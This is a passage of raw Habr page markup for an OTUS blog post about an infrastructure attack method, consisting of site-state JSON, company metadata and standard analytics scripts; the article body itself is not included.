Disclame...\",\"url\":\"https:\\\u002F\\\u002Fhabr.com\\\u002Fru\\\u002Fcompany\\\u002Fotus\\\u002Fblog\\\u002F583496\\\u002F#post-content-body\",\"about\":[\"c_otus\",\"h_infosecurity\",\"f_develop\"],\"image\":[\"https:\\\u002F\\\u002Fhabr.com\\\u002Fshare\\\u002Fpublication\\\u002F583496\\\u002F2c3a9ed28530c8d47005451106673a9b\\\u002F\",\"https:\\\u002F\\\u002Fhabrastorage.org\\\u002Fgetpro\\\u002Fhabr\\\u002Fupload_files\\\u002F6d3\\\u002F544\\\u002Faeb\\\u002F6d3544aebb54f70f40be8065de5b8384.png\",\"https:\\\u002F\\\u002Fhabrastorage.org\\\u002Fgetpro\\\u002Fhabr\\\u002Fupload_files\\\u002F551\\\u002F4ec\\\u002Ff2b\\\u002F5514ecf2bd8b46247e40113f318f71fe.PNG\",\"https:\\\u002F\\\u002Fhabrastorage.org\\\u002Fgetpro\\\u002Fhabr\\\u002Fupload_files\\\u002Fbca\\\u002F2bf\\\u002Fa17\\\u002Fbca2bfa176a5e71d6fc0d710c195784e.PNG\",\"https:\\\u002F\\\u002Fhabrastorage.org\\\u002Fgetpro\\\u002Fhabr\\\u002Fupload_files\\\u002F403\\\u002F55c\\\u002F3df\\\u002F40355c3dfe0c2707cd01efce80c7de10.PNG\",\"https:\\\u002F\\\u002Fhabrastorage.org\\\u002Fgetpro\\\u002Fhabr\\\u002Fupload_files\\\u002Fd22\\\u002F6b4\\\u002F292\\\u002Fd226b4292bc3b2dc4d065d146c4689bf.PNG\",\"https:\\\u002F\\\u002Fhabrastorage.org\\\u002Fgetpro\\\u002Fhabr\\\u002Fupload_files\\\u002F00c\\\u002Fbc0\\\u002Fd71\\\u002F00cbc0d71b5280cacbfc53a63dd8cda5.PNG\"]}","metaDescription":"Статья расскажет о вариации нового метода атаки на инфраструктуру. Рассмотрим основные инструменты, подготовим тестовый стенд и проведем тест. Небольшой Disclamer: статья не претендует на полноту, но...","mainImageUrl":null,"amp":true},"polls":[],"commentsEnabled":true,"rulesRemindEnabled":false,"votesEnabled":true,"status":"published","plannedPublishTime":null,"checked":null,"isEditorial":false}},"articlesIds":{},"isLoading":false,"pagesCount":{},"route":{},"reasonsList":null,"view":"cards","lastVisitedRoute":{},"ssrCommentsArticleIds":[""],"karma":{}},"authorContribution":{"authors":{}},"betaTest":{"currentAnnouncement":null,"announcements":{},"announcementCards":null,"announcementComments":{},"announcementCommentThreads":{},"announcementCommentingStatuses":{},"archivedList":[]},"authorStatistics":{"articleRefs":{},"articleIds":{},"pagesCount":{},"route":{},"viewsCount":[],"maxStatsCount":{}},"career":{"seoLandings":[],"hubs":""},"comments":{"articleComments":{},"searchCommentsResults":null,"previewComment":null,"pagesCount":null,"commentAccess":{},"scrollParents":{},"pageArticleComments":{"lastViewedComment":0,"postId":null,"lastCommentTimestamp":"","moderated":[],"moderatedIds":[],"commentRoute":""}},"companies":{"companyRefs":{"otus":{"alias":"otus","imageUrl":"\u002F\u002Fhabrastorage.org\u002Fgetpro\u002Fhabr\u002Fcompany\u002F968\u002F422\u002F761\u002F968422761136a38a89fc391fd927f903.jpg","titleHtml":"OTUS","descriptionHtml":"Цифровые навыки от ведущих экспертов","relatedData":null,"statistics":{"postsCount":1483,"newsCount":2,"vacanciesCount":0,"employeesCount":46,"careerRating":null,"subscribersCount":66839,"rating":404.8,"invest":null},"foundationDate":{"year":"2017","month":"04","day":"01"},"location":{"city":{"id":"447159","title":"Москва"},"region":{"id":"1885","title":"Москва и Московская обл."},"country":{"id":"168","title":"Россия"}},"siteUrl":"https:\u002F\u002Fotus.ru","staffNumber":"51–100 человек","registrationDate":"2017-03-22T08:17:26+00:00","representativeUser":{"alias":"MaxRokatansky","fullname":"OTUS"},"contacts":[{"title":"Сайт","url":"https:\u002F\u002Fotus.ru"},{"title":"Facebook","url":"https:\u002F\u002Ffacebook.com\u002Fotus.ru"},{"title":"ВКонтакте","url":"https:\u002F\u002Fvk.com\u002Fclub145052891"},{"title":"Telegram","url":"https:\u002F\u002Ftelegram.me\u002FOtusjava"}],"settings":{"analyticsSettings":[],"branding":null,"status":"active"},"metadata":{"titleHtml":"OTUS, Москва - Цифровые навыки от ведущих экспертов с 1 апреля 2017 г.","title":"OTUS, Москва - Цифровые навыки от ведущих экспертов с 1 апреля 2017 г.","keywords":["Программирование","Python","Java","Информационная безопасность","Машинное обучение"],"descriptionHtml":"1 483 статьи от авторов компании OTUS","description":"1 483 статьи от авторов компании OTUS"},"aDeskSettings":null,"careerAlias":"otus","maxCustomTrackerLinks":0}},"companyIds":{},"companyTopIds":{},"pagesCount":{},"companyProfiles":{},"companiesCategories":[],"companiesCategoriesTotalCount":0,"companiesWidgets":{},"companiesWorkers":{},"companiesFans":{},"route":{},"isLoading":false,"companyWorkersLoading":false,"companyFansLoading":false,"vacancies":{}},"companiesContribution":{"hubs":{},"flows":{},"companyRefs":{}},"companyHubsContribution":{"contributionRefs":{"hubRefs":{},"hubIds":{}}},"conversation":{"messages":[],"respondent":null,"isLoadMore":false},"conversations":{"conversations":[],"unreadCount":0,"pagesCount":0,"isLoadMore":false},"desktopState":{"desktopFl":null,"desktopHl":null,"isChecked":false,"isLoginDemanded":false},"dfp":{"slotsDict":{}},"docs":{"menu":{},"articles":{},"mainMenu":[],"loading":{"main":false,"dropdown":false,"article":false}},"feature":{"isProbablyVisible":"true"},"flows":{"flows":[{"alias":"develop","id":1,"route":{"name":"FLOW_PAGE","params":{"flowName":"develop"}}},{"alias":"admin","id":6,"route":{"name":"FLOW_PAGE","params":{"flowName":"admin"}}},{"alias":"design","id":2,"route":{"name":"FLOW_PAGE","params":{"flowName":"design"}}},{"alias":"management","id":3,"route":{"name":"FLOW_PAGE","params":{"flowName":"management"}}},{"alias":"marketing","id":4,"route":{"name":"FLOW_PAGE","params":{"flowName":"marketing"}}},{"alias":"popsci","id":7,"route":{"name":"FLOW_PAGE","params":{"flowName":"popsci"}}}]},"global":{"isPwa":false,"device":"desktop","isHabrCom":true},"hubs":{"hubRefs":{},"hubIds":{},"pagesCount":{},"isLoading":false,"route":{}},"hubsBlock":{"hubRefs":{},"hubIds":{}},"i18n":{"fl":"ru","hl":"ru"},"info":{"infoPage":{},"isLoading":true},"location":{"urlStruct":{"protocol":null,"slashes":null,"auth":null,"host":null,"port":null,"hostname":null,"hash":null,"search":null,"query":{},"pathname":null,"path":null,"href":""},"searchQuery":null},"me":{"user":null,"ppgDemanded":false,"karmaResetInfo":{"canReincarnate":null,"wasReincarnated":null,"currentScore":null},"notes":null},"mostReadingList":{"mostReadingListIds":[],"mostReadingListRefs":null,"promoPost":null},"pinnedPost":{"pinnedPost":null},"ppa":{"articles":{},"card":null,"transactions":null,"totalTransactions":null,"isAccessible":null},"projectsBlocks":{"activeBlocks":{}},"pullRefresh":{"shouldRefresh":false},"sandbox":{"articleIds":[],"articleRefs":{},"pagesCount":null,"route":{},"lastVisitedRoute":{},"isLoading":false},"settingsOther":{"inputs":{"uiLang":{"errors":[],"ref":null,"value":""},"articlesLangEnglish":{"errors":[],"ref":null,"value":false},"articlesLangRussian":{"errors":[],"ref":null,"value":false},"agreement":{"errors":[],"ref":null,"value":false},"email":{"errors":[],"ref":null,"value":true},"digest":{"errors":[],"ref":null,"value":true}}},"similarList":{"similarListIds":[],"similarListRefs":null},"ssr":{"error":null,"isDataLoaded":false,"isDataLoading":false,"isHydrationFailed":false,"isServer":false},"userHubsContribution":{"contributionRefs":{"hubRefs":{},"hubIds":{}}},"userInvites":{"availableInvites":0,"usedInvitesIds":[],"usedInvitesRefs":{},"usedInvitesPagesCount":0,"unusedInvitesIds":[],"unusedInvitesRefs":{},"unusedInvitesPagesCount":0},"users":{"authorRefs":{},"authorIds":{},"pagesCount":{},"authorProfiles":{},"userHubs":{},"userInvitations":{},"authorFollowers":{},"authorFollowed":{},"karmaStats":[],"statistics":null,"isLoading":false,"authorFollowersLoading":false,"authorFollowedLoading":false,"userHubsLoading":false,"userInvitationsLoading":false,"route":{}},"viewport":{"prevScrollY":{},"scrollY":0,"width":0},"tracker":{"items":{},"pagesCache":{},"markedViewedSilently":{},"markedRead":{},"unreadCounters":{"applications":null,"system":null,"mentions":null,"subscribers":null,"posts_and_comments":null},"unviewedCounters":{"applications":null,"system":null,"mentions":null,"subscribers":null,"posts_and_comments":null}}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script>
+<script src="https://assets.habr.com/habr-web/js/chunk-vendors.c2c3fc9a.js" defer></script><script src="https://assets.habr.com/habr-web/js/app.c0af73e7.js" defer></script>
+
+
+
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    </script>
+  
+  <script type="text/javascript" >
+    (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+    m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+    (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+    ym(24049213, "init", {
+      defer:true,
+      trackLinks:true,
+      accurateTrackBounce:true,
+      webvisor:false,
+    });
+  </script>
+  <noscript>
+    <div>
+      <img src="https://mc.yandex.ru/watch/24049213" style="position:absolute; left:-9999px;" alt="" />
+    </div>
+  </noscript>
+  
+    <script type="text/javascript">
+      window.addEventListener('load', function () {
+        setTimeout(() => {
+          const img = new Image();
+          img.src = 'https://vk.com/rtrg?p=VK-RTRG-421343-57vKE';
+        }, 0);
+      });
+    </script>
+  
+</body>
+</html>
